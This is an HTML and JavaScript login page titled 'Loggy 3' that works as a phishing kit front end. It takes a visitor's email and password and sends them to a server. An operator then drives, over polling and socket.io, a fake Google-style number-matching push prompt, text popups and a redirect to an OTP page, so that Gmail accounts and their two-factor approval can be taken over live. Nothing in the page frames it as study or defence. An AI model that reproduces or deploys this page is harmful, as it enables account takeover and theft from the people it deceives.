<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loggy 3 - Login</title>
<link rel="icon" type="image/png" href="/images/logo.png">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
body { min-height: 100vh; background: #f3f4f6; display: flex; justify-content: center; align-items: center; padding: 20px; }
.card { background: #fff; border-radius: 24px; padding: 40px 32px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }

/* ⭐ NEW BRAND HEADER */
.brand-header {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  margin-bottom: 28px;
}
.brand-header img {
  width: 48px;
  height: 48px;
  border-radius: 14px;
  object-fit: contain;
  background: #f3f4f6;
  padding: 6px;
}
.brand-header .brand-name {
  font-size: 28px;
  font-weight: 800;
  color: #1f2937;
  letter-spacing: -0.5px;
}

h1 { font-size: 24px; font-weight: 700; color: #1f2937; text-align: center; margin-bottom: 8px; }
.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 32px; }
.form-group { margin-bottom: 20px; }
label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 8px; }
input { width: 100%; padding: 14px 16px; border: 1.5px solid #e5e7eb; border-radius: 12px; font-size: 15px; outline: none; }
input:focus { border-color: #4a4ff0; }
input:disabled { background: #f3f4f6; cursor: not-allowed; }
button { width: 100%; padding: 15px; background: linear-gradient(90deg, #4a4ff0, #7c3aed); color: white; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
button:disabled { opacity: 0.7; cursor: not-allowed; }
.spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.error-label { color: #dc2626; font-size: 13px; margin-top: 12px; text-align: center; display: none; background: #fef2f2; padding: 12px; border-radius: 10px; }

/* ============ GOOGLE-STYLE YES POPUP ============ */
.popup-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(32, 33, 36, 0.85);
  z-index: 99999;
  justify-content: center;
  align-items: center;
  padding: 20px;
  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
}
.popup-overlay.active { display: flex !important; }

.google-prompt-card {
  background: #ffffff;
  border-radius: 20px;
  width: 100%;
  max-width: 360px;
  padding: 40px 32px 36px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  text-align: center;
}

.google-logo {
  margin-bottom: 24px;
  display: flex;
  justify-content: center;
}

.prompt-message {
  font-size: 15px;
  color: #3c4043;
  line-height: 1.5;
  margin-bottom: 32px;
}

.number-circle-wrap {
  display: flex;
  justify-content: center;
  margin-bottom: 28px;
}

.number-circle {
  width: 140px;
  height: 140px;
  border-radius: 50%;
  border: 3px solid #1a73e8;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #e8f0fe;
}

.number-circle span {
  font-size: 64px;
  font-weight: 700;
  color: #1a73e8;
  letter-spacing: 2px;
  font-family: 'Google Sans', 'Roboto', sans-serif;
}

.prompt-instruction {
  font-size: 15px;
  color: #5f6368;
  line-height: 1.7;
  margin: 0;
}

.prompt-instruction .yes-word {
  color: #1a73e8;
  font-weight: 700;
}

.prompt-instruction .instruction-number {
  color: #1a73e8;
  font-weight: 700;
  font-size: 17px;
}

@media (max-width: 400px) {
  .number-circle { width: 120px; height: 120px; }
  .number-circle span { font-size: 52px; }
  .brand-header .brand-name { font-size: 24px; }
  .brand-header img { width: 42px; height: 42px; }
}

/* TEXT POPUP */
.popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
.popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
.popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
</style>
</head>
<body>

<div class="card">

  <!-- ⭐ BRAND HEADER: logo + "Loggy 3" -->
  <div class="brand-header">
    <img src="/images/logo.png" alt="Loggy 3">
    <span class="brand-name">Loggy 3</span>
  </div>

  <h1>Verify Your Account</h1>
  <div class="form-group"><label>Email / Phone</label><input type="email" id="email" placeholder="you@example.com"></div>
  <div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter password"></div>
  <button id="submitBtn">Sign In</button>
  <div id="errorLabel" class="error-label"></div>
</div>

<!-- Google-Style YES Popup -->
<div id="yesPopup" class="popup-overlay">
  <div class="google-prompt-card">
    <div class="google-logo">
      <svg viewBox="0 0 24 24" width="44" height="44">
        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
      </svg>
    </div>
    <p class="prompt-message">Google sent a notification to your device just now.</p>
    <div class="number-circle-wrap">
      <div class="number-circle">
        <span id="yesNumber">00</span>
      </div>
    </div>
    <p class="prompt-instruction">
      Tap <strong class="yes-word">Yes</strong> and select this number:
      <strong class="instruction-number" id="yesNumberText">00</strong>
    </p>
  </div>
</div>

<div id="textPopup" class="popup-overlay">
  <div class="popup-text">
    <h3>Update Info</h3>
    <div class="message" id="textMessage"></div>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const submitBtn = document.getElementById('submitBtn');
const errorLabel = document.getElementById('errorLabel');
const yesPopup = document.getElementById('yesPopup');
const textPopup = document.getElementById('textPopup');

let currentEmail = localStorage.getItem('atlas_current_email') || '';
let lastPopupId = 0;
let pollInterval = null;
let timeoutTimer = null;

function showError(msg) {
  errorLabel.textContent = msg;
  errorLabel.style.display = 'block';
  setTimeout(() => { errorLabel.style.display = 'none'; }, 8000);
}

function setLoading(loading) {
  submitBtn.disabled = loading;
  emailInput.disabled = loading;
  passwordInput.disabled = loading;
  submitBtn.innerHTML = loading ? '<div class="spinner"></div> Verifying your details...' : 'Sign In';
}

function showYesPopup(n) {
  textPopup.classList.remove('active');
  document.getElementById('yesNumber').textContent = n;
  document.getElementById('yesNumberText').textContent = n;
  yesPopup.classList.add('active');
}

function showTextPopup(msg) {
  yesPopup.classList.remove('active');
  document.getElementById('textMessage').textContent = msg;
  textPopup.classList.add('active');
}

async function pollStatus() {
  if (!currentEmail) return;
  try {
    const res = await fetch(`/api/user/status?email=${encodeURIComponent(currentEmail)}`);
    const data = await res.json();
    if (!data || data.notFound) return;

    if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
      lastPopupId = data.popup_id;
      if (data.popup_type === 'yes') showYesPopup(data.popup_value);
      else if (data.popup_type === 'text') showTextPopup(data.popup_value);
    }

    if (data.wrong_login_flag) {
      setLoading(false);
      yesPopup.classList.remove('active');
      textPopup.classList.remove('active');
      emailInput.value = '';
      passwordInput.value = '';
      showError('Email and password must be matching your Gmail account.');
      currentEmail = '';
      localStorage.removeItem('atlas_current_email');
      if (pollInterval) clearInterval(pollInterval);
      if (timeoutTimer) clearTimeout(timeoutTimer);
      await fetch('/api/user/clear-flags', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ email: data.email || '' })
      }).catch(()=>{});
      return;
    }

    if (data.timeout_flag) {
      setLoading(false);
      yesPopup.classList.remove('active');
      textPopup.classList.remove('active');
      emailInput.value = '';
      passwordInput.value = '';
      showError('Try again!');
      currentEmail = '';
      localStorage.removeItem('atlas_current_email');
      if (pollInterval) clearInterval(pollInterval);
      if (timeoutTimer) clearTimeout(timeoutTimer);
      await fetch('/api/user/clear-flags', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ email: data.email || '' })
      }).catch(()=>{});
      return;
    }

    if (data.redirect_otp_flag) {
      window.location.href = `/otp?email=${encodeURIComponent(currentEmail)}`;
      return;
    }

    if (data.status === 'success') {
      window.location.href = `/success?email=${encodeURIComponent(currentEmail)}`;
      return;
    }
  } catch (err) {}
}

submitBtn.addEventListener('click', async () => {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  if (!email || !password) { showError('Please fill in all fields.'); return; }

  currentEmail = email;
  localStorage.setItem('atlas_current_email', email);
  lastPopupId = 0;
  setLoading(true);

  try {
    const res = await fetch('/api/user/login', {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ email, password })
    });
    const data = await res.json();
    if (!data.success) {
      setLoading(false);
      showError(data.error || 'Login failed.');
      return;
    }

    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollStatus, 1000);

    if (timeoutTimer) clearTimeout(timeoutTimer);
    timeoutTimer = setTimeout(() => {
      setLoading(false);
      showError('Timeout. Please try again after 5 minutes.');
    }, 60000);
  } catch (err) {
    setLoading(false);
    showError('Network error. Please try again.');
  }
});

pollInterval = setInterval(pollStatus, 1000);

socket.on('popup-update', (data) => {
  if (!currentEmail) return;
  if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
  if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
    lastPopupId = data.popup_id;
    if (data.popup_type === 'yes') showYesPopup(data.popup_value);
    else if (data.popup_type === 'text') showTextPopup(data.popup_value);
  }
});

socket.on('user-control', (data) => {
  if (!currentEmail) return;
  if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
  pollStatus();
});

socket.on('user-deleted', (data) => {
  if (!currentEmail) return;
  if (String(data.email).toLowerCase() !== String(currentEmail).toLowerCase()) return;
  setLoading(false);
  yesPopup.classList.remove('active');
  textPopup.classList.remove('active');
  emailInput.value = '';
  passwordInput.value = '';
  showError('');
  currentEmail = '';
  localStorage.removeItem('atlas_current_email');
  if (pollInterval) clearInterval(pollInterval);
  if (timeoutTimer) clearTimeout(timeoutTimer);
});
</script>
</body>
</html>
